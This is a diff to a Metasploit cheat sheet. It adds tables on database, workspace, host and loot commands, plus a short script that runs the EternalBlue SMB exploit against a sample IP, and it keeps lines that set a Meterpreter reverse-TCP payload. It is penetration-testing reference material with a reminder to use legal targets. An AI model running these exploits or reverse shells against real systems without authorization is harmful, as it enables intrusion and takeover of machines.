@@ -17,7 +17,112 @@ vulnerability assessment, and post-exploitation.
 | `msfdb start`  | Start the database service |
 | `msfdb stop`   | Stop the database service |
 | `msfdb status` | Check database status |
+|  exit           | # Exit Metasploit
 | `msfupdate`    | Update Metasploit Framework |
+|  systemctl     | Used to start, stop, enable services like PostgreSQL for Metasploit.
+|  sudo systemctl status postgresql     |  ✅ Shows if PostgreSQL is running or not.
+|  sudo systemctl start postgresql      | # Start the service  
+|  sudo systemctl stop postgresql       | # Stop the service  
+
+
+
+
+
+
+# Metasploit Workspace Commands (Cheat Sheet)
+
+Workspaces in Metasploit help organize penetration testing data by separating targets, scans, and exploits into different projects. 
+
+
+
+##  Basic Workspace Management  
+| Command | Description |
+|---------|-------------|
+| `workspace` | List all workspaces (current marked with `*`) |
+| `workspace -a [name]` | Add a new workspace (e.g., `workspace -a Client_A`) |
+| `workspace -d [name]` | Delete a workspace |
+| `workspace [name]` | Switch to a workspace |
+| `workspace -r [old] [new]` | Rename a workspace |
+
+
+
+##  Importing & Exporting Data 
+| Command | Description |
+|---------|-------------|
+| `db_import [file]` | Import scan results (Nmap, Nessus, Burp, etc.) |
+| `db_export -f [format] [file]` | Export workspace data (XML, JSON, etc.) |
+| `hosts` | List all hosts in the current workspace |
+| `services` | List all discovered services |
+
+
+
+##  Host & Service Management 
+| Command | Description |
+|---------|-------------|
+| `hosts -h` | Show help for host commands |
+| `hosts -a [IP]` | Add a host manually |
+| `hosts -d [IP]` | Delete a host |
+| `hosts -R [IP]` | Remove all data for a host |
+| `services -p [port]` | Filter services by port (e.g., `services -p 80,443`) |
+
+
+
+##  Workspace Automation with Resource Scripts
+
+# Example: Create a workspace, import Nmap scan, and run an exploit
+workspace -a Pentest_Project
+db_import /path/to/nmap_scan.xml
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 192.168.1.100
+exploit
+
+
+
+
+##  Advanced Workspace Commands
+| Command | Description |
+|---------|-------------|
+| `workspace -v` | Show verbose workspace info |
+| `vulns` | List all vulnerabilities in the workspace |
+| `loot` | View collected loot (hashes, files, etc.) |
+| `notes` | View saved notes (e.g., credentials, findings) |
+
+
+
+##  Clearing Workspace Data  
+| Command | Description |
+|---------|-------------|
+| `hosts -c` | Clear all hosts |
+| `services -c` | Clear all services |
+| `db_cleanup` | Remove orphaned data |
+
+
+
+### Example Workflow
+
+# Create a workspace for a client
+workspace -a Acme_Corp
+
+# Import an Nmap scan
+db_import acme_scan.xml
+
+# List all hosts
+hosts
+
+# Switch to another workspace
+workspace Default
+
+
+
+
+### Summary 
+- Workspaces help **organize penetration testing data** by project.  
+- Use `db_import` for **loading scan results**.  
+- `hosts` and `services` filter **discovered systems**.  
+- Export data with `db_export` for **reporting**.  
+🚀 Use workspaces to stay organized during security assessments!
+
+
 
 
 
@@ -165,9 +270,8 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST 192.168.1.10
 set LPORT 4444
 exploit
-```
 
----
+
 
 ## **8. Troubleshooting & Tips**  
 
@@ -176,18 +280,18 @@ exploit
 - **Exploit failing?** → Check `options`, `set VERBOSE true`  
 - **Session dies?** → Use `AutoRunScript` for auto-migration  
 
-### **Useful Shortcuts**  
+### Useful Shortcuts
 - `TAB` → Auto-complete  
 - `Ctrl+Z` → Background session  
 - `sessions -i [ID]` → Resume session  
 
----
 
-## **Conclusion**  
+
+## Conclusion
 This cheat sheet covers **Metasploit from A to Z**, from basic exploitation to advanced post-exploitation. Bookmark it for quick reference during penetration tests!  
 
-🚀 **Happy Hacking!** (Ethically, of course.)  
+🚀 Happy Hacking!** (Ethically, of course.)  
 
----
 
-**📌 Pro Tip:** Always update Metasploit (`msfupdate`) and use legal targets for testing.
+
+📌 Pro Tip: Always update Metasploit (`msfupdate`) and use legal targets for testing.
